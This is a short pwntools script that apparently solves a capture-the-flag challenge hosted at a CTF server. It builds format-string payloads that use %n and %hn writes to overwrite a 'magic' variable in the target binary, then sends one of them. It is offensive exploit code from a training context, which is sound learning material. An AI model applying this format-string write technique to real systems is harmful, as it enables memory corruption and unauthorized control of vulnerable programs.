from pwn import *

host = 'csie.ctf.tw'
port = 10142
y = remote(host,port)

magic = 0x804a038
ad = 0x80486e1
phd = 0x8048711
ret = 0x080485a1

flag = 0xda
craxflag = 0xfaceb00c

fmt1 = p32(magic) + '%.' + str( 0xda - 4 ) + 'x%7$n'
fmt2 = p32(magic) + p32(magic + 0x2) + '%.' + str( 0xb00c - 8 ) + 'x%7$hn%.' + str( 0xface - 0xb00c ) + 'x%8$hn'


y.sendline( fmt1 )

print y.recvall()
